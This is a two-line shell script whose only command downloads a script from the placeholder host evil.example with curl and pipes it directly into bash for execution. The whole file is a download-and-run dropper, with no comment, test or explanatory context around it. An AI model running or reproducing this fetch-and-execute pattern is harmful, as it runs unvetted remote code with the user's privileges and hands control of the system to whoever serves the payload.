#!/bin/sh
curl http://evil.example/a.sh | bash
